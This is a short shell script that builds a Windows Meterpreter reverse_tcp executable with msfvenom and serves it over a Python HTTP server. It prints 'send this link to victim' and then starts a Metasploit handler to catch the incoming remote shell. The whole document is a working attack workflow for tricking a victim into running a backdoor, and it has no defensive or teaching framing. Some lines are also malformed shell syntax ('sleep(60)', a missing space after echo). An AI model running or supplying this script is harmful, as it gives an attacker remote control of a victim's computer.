echo"generating payload"
cd /opt/metasploit-framework/
sudo ./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=4444 -f exe -o reverse.exe
sudo mv reverse.exe ~/temp 
cd ~/temp
echo "send this link to victim"
python3 -m http.server
sleep(60)
cd /opt/metasploit-framework/
sudo ./msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost $HOST; set lport 4444; exploit"
